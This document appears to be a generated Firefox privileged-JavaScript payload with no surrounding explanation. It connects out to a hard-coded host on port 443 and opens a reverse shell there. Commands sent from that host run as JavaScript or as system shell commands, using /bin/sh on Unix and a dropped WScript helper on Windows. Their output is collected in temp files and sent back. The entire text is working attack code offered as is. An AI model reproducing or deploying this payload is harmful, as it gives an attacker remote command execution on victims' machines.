
      (function(){
        window = this;

        Components.utils.import("resource://gre/modules/NetUtil.jsm");
        var host = '192.168.1.15';
        var port = 443;

        var socketTransport = Components.classes["@mozilla.org/network/socket-transport-service;1"]
                                .getService(Components.interfaces.nsISocketTransportService);
        var socket = socketTransport.createTransport(null, 0, host, port, null);
        var outStream = socket.openOutputStream(0, 0, 0);
        var inStream = socket.openInputStream(0, 0, 0);

        var pump = Components.classes["@mozilla.org/network/input-stream-pump;1"]
                       .createInstance(Components.interfaces.nsIInputStreamPump);
        pump.init(inStream, -1, -1, 0, 0, true);

        
      var readUntilToken = function(cb) {
        Components.utils.import("resource://gre/modules/NetUtil.jsm");

        var buffer = '', m = null;
        return function(request, context, stream, offset, count) {
          buffer += NetUtil.readInputStreamToString(stream, count);
          if (buffer.match(/^(\[\[\w{8}\]\])/)) {
            if (m = buffer.match(/^(\[\[\w{8}\]\])([\s\S]*)\1/)) {
              cb(m[2]);
              buffer = '';
            }
          } else if (buffer.indexOf("\n") > -1) {
            cb(buffer);
            buffer = '';
          }
        };
      };
    

        var listener = {
          onStartRequest: function(request, context) {},
          onStopRequest: function(request, context) {},
          onDataAvailable: readUntilToken(function(data) {
            runCmd(data, function(err, output) {
              if (!err) outStream.write(output, output.length);
            });
          })
        };

        
      
      var readFile = function(path) {
        try {
          var file = Components.classes["@mozilla.org/file/local;1"]
                   .createInstance(Components.interfaces.nsILocalFile);
          file.initWithPath(path);

          var fileStream = Components.classes["@mozilla.org/network/file-input-stream;1"]
                           .createInstance(Components.interfaces.nsIFileInputStream);
          fileStream.init(file, 1, 0, false);

          var binaryStream = Components.classes["@mozilla.org/binaryinputstream;1"]
                             .createInstance(Components.interfaces.nsIBinaryInputStream);
          binaryStream.setInputStream(fileStream);
          var array = binaryStream.readByteArray(fileStream.available());

          binaryStream.close();
          fileStream.close();
          file.remove(true);

          return array.map(function(aItem) { return String.fromCharCode(aItem); }).join("");
        } catch (e) { return ""; }
      };
    
      
      var setTimeout = function(cb, delay) {
        var timer = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
        timer.initWithCallback({notify:cb}, delay, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
        return timer;
      };
    

      var ua = Components.classes["@mozilla.org/network/protocol;1?name=http"]
        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
      var windows = (ua.indexOf("Windows")>-1);
      var svcs = Components.utils.import("resource://gre/modules/Services.jsm");
      var jscript = ({"src":"\n      var b64 = WScript.arguments(0);\n      var dom = new ActiveXObject(\"MSXML2.DOMDocument.3.0\");\n      var el  = dom.createElement(\"root\");\n      el.dataType = \"bin.base64\"; el.text = b64; dom.appendChild(el);\n      var stream = new ActiveXObject(\"ADODB.Stream\");\n      stream.Type=1; stream.Open(); stream.Write(el.nodeTypedValue);\n      stream.Position=0; stream.type=2; stream.CharSet = \"us-ascii\"; stream.Position=0;\n      var cmd = stream.ReadText();\n      (new ActiveXObject(\"WScript.Shell\")).Run(cmd, 0, true);\n    "}).src;
      var runCmd = function(cmd, cb) {
        cb = cb || (function(){});

        if (cmd.trim().length == 0) {
          setTimeout(function(){ cb("Command is empty string ('')."); });
          return;
        }

        var js = (/^\s*\[JAVASCRIPT\]([\s\S]*)\[\/JAVASCRIPT\]/g).exec(cmd.trim());
        if (js) {
          var tag = "[!JAVASCRIPT]";
          var sync = true;  /* avoid zalgo's reach */
          var sent = false;
          var retVal = null;

          try {
            this.send = function(r){
              if (sent) return;
              sent = true;
              if (r) {
                if (sync) setTimeout(function(){ cb(false, r+tag+"\n"); });
                else      cb(false, r+tag+"\n");
              }
            };
            retVal = Function(js[1]).call(this);
          } catch (e) { retVal = e.message; }

          sync = false;

          if (retVal && !sent) {
            sent = true;
            setTimeout(function(){ cb(false, retVal+tag+"\n"); });
          }

          return;
        }

        var shEsc = "\\$&";
        var shPath = "/bin/sh -c";

        if (windows) {
          shPath = "cmd /c";
          shEsc = "\^$&";
          var jscriptFile = Components.classes["@mozilla.org/file/directory_service;1"]
            .getService(Components.interfaces.nsIProperties)
            .get("TmpD", Components.interfaces.nsIFile);
          jscriptFile.append('PmMT74LLSex1AvU8d.js');
          var stream = Components.classes["@mozilla.org/network/safe-file-output-stream;1"]
            .createInstance(Components.interfaces.nsIFileOutputStream);
          stream.init(jscriptFile, 0x04 | 0x08 | 0x20, 0666, 0);
          stream.write(jscript, jscript.length);
          if (stream instanceof Components.interfaces.nsISafeOutputStream) {
            stream.finish();
          } else {
            stream.close();
          }
        }

        var stdoutFile = "VvSb5lHeC2aa";

        var stdout = Components.classes["@mozilla.org/file/directory_service;1"]
          .getService(Components.interfaces.nsIProperties)
          .get("TmpD", Components.interfaces.nsIFile);
        stdout.append(stdoutFile);

        var shell;
        cmd = cmd.trim();
        if (windows) {
          shell = shPath+" "+cmd;
          shell = shPath+" "+shell.replace(/\W/g, shEsc)+" >"+stdout.path+" 2>&1";
          var b64 = svcs.btoa(shell);
        } else {
          shell = shPath+" "+cmd.replace(/\W/g, shEsc);
          shell = shPath+" "+shell.replace(/\W/g, shEsc) + " >"+stdout.path+" 2>&1";
        }

        var process = Components.classes["@mozilla.org/process/util;1"]
          .createInstance(Components.interfaces.nsIProcess);
        var sh = Components.classes["@mozilla.org/file/local;1"]
                   .createInstance(Components.interfaces.nsILocalFile);

        if (windows) {
          sh.initWithPath("C:\\Windows\\System32\\wscript.exe");
          process.init(sh);
          var args = [jscriptFile.path, b64];
          process.run(true, args, args.length);
          jscriptFile.remove(true);
          setTimeout(function(){cb(false, cmd+"\n"+readFile(stdout.path));});
        } else {
          sh.initWithPath("/bin/sh");
          process.init(sh);
          var args = ["-c", shell];
          process.run(true, args, args.length);
          setTimeout(function(){cb(false, readFile(stdout.path));});
        }
      };
    

        pump.asyncRead(listener, null);
      })();

